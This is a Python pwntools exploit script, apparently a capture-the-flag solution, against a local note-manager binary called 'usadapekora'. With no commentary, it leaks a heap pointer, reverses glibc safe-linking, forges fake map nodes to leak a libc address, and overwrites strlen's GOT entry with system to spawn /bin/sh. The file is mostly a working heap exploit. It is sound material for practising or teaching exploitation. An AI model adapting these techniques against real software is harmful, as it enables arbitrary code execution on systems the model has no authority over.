

from pwn import *

p = process("./usadapekora")

def add_note(key, size, content):
    p.sendlineafter(">", b"1")
    p.sendlineafter("Key:", str(key).encode("latin-1"))
    p.sendlineafter("Size:", str(size).encode("latin-1"))
    p.sendlineafter("Content", content)

def delete_note(index, key):
    p.sendlineafter(">", b"2")
    p.sendlineafter("Index:", str(index).encode("latin-1"))
    p.sendlineafter("Key:", str(key).encode("latin-1"))

def edit_note(index=None, key=None, content=b""):
    p.sendlineafter(">", b"3")
    if(index != None):
        p.sendlineafter("by:", b"1")
        p.sendlineafter("Index:", str(index).encode("latin-1"))
        p.sendlineafter("Content:", content)

    elif(key != None):
        p.sendlineafter("by:", b"2")
        p.sendlineafter("Key:", str(key).encode("latin-1"))
        p.sendlineafter("Content:", content)
    else:
        print("Idiot")


def show_note(index=None, key=None):
    p.sendlineafter(">", b"4")
    if(index != None):
        p.sendlineafter("by:", b"1")
        p.sendlineafter("Index:", str(index).encode("latin-1"))
    elif(key != None):
        p.sendlineafter("by:", b"2")
        p.sendlineafter("Key:", str(key).encode("latin-1"))
    else:
        print("Idiot")

def decrypt_safe_linking(enc):
    key = 0
    plain = 0

    for i in range(6):
        bits = 64-12*i
        if(bits < 0):
            bits = 0
        plain = ((enc ^ key) >> bits) << bits
        key = plain >> 12
    return plain

add_note(0, 4, "asd")
add_note(1, 4, "asd")
delete_note(0, 0)
delete_note(1, 1)
add_note(2, 0, "")
show_note(2)
enc_heap_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
print(hex(enc_heap_leak))
heap_leak = decrypt_safe_linking(enc_heap_leak)
print(hex(heap_leak))
print(hex(heap_leak ^ (heap_leak >> 12)))
heap_base = heap_leak - 0x12ec0
libc_leak_chunk = heap_base + 0x136d0
fake_map_node = heap_base + 0x13b00
fake_it_pointer = heap_base + 0x13440

for i in range(3, 13):
    add_note(i, 0x18, "/bin/sh\x00")

add_note(13, 0x18, p64(fake_map_node))
add_note(14, 0x500, "asd")
add_note(15, 0x500, p64(0xffffffffffffffff)*2 + p64(libc_leak_chunk)*3)
delete_note(14, 14)
add_note(16, 0x100, p64(fake_map_node)*11 + p64(fake_it_pointer)*17)
show_note(key=4294967295)
libc_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
print(hex(libc_leak))
libc_base = libc_leak - 0x219ce0
strlen_got = libc_base + 0x219098
system = libc_base + 0x50d60
edit_note(index=15, content=p64(0xffffffffffffffff)*2 + p64(strlen_got)[:-2])
edit_note(key=4294967295, content=p64(system)[:-2])
show_note(index=4)

p.interactive()
